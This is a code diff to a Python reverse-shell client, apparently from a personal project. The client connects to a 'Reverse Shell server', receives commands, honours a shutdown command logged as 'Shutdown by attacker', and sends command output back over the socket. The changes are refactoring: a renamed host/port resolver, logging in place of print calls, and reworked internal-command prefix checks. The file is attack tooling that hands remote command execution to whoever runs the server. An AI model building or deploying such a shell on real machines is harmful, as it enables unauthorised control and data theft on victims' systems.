@@ -20,9 +20,10 @@ import logger
 
 DEFAULT_LOCALE = []
 
-def resolve_hp():
-    """Reolve host and port.
-    """
+
+def __resolve_hp():
+    """Reolve host and port."""
+
     # Resolve arguments.
     arg_len = len(sys.argv)
 
@@ -36,7 +37,7 @@ def resolve_hp():
     else:
         port = constant.PORT
 
-    return (host, port)
+    return host, port
 
 
 def main():
@@ -44,7 +45,7 @@ def main():
 
     DEFAULT_LOCALE = locale.getdefaultlocale()[1]
 
-    host, port = resolve_hp()
+    host, port = __resolve_hp()
 
     logger.info("Connecting to the Reverse Shell server...")
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -65,16 +66,22 @@ def main():
             data_str = str(data)
             logger.info(f"Received: {data_str}");
 
+
             # Check if is internal command type.
-            iic = command.is_internal_command(in_cmd)
+            iicp = command.is_internal_command_prefix(in_cmd)
+            iic = False
+            if iicp:
+                # Remove prefix, get the internal command.
+                rl_cmd = in_cmd[1:]
+                iic = command.is_internal_command(rl_cmd)
+                if not iic:
+                    logger.error(f"'{in_cmd}' is not recognized internal command.")
 
             if iic:
-                # Remove prefix, get the real command.
-                in_cmd = in_cmd[1:]
-                if in_cmd == command.Command.SHUTDOWN.value:
+                # NOTE(jenchieh): Check possible command at this moment.
+                if rl_cmd == command.Command.SHUTDOWN.value:
+                    logger.info("Shutdown by attacker...")
                     break
-                else:
-                    print(f"'{in_cmd}' is not recognized internal command.")
 
             cd_path = in_cmd.split(" ")
 
@@ -100,7 +107,7 @@ def main():
             # Send results
             s.sendall(output)
 
-        print("Cleaning the socket buffer...")
+        logger.info("Cleaning the socket buffer...")
         s.shutdown(socket.SHUT_RDWR)
         s.close()
 
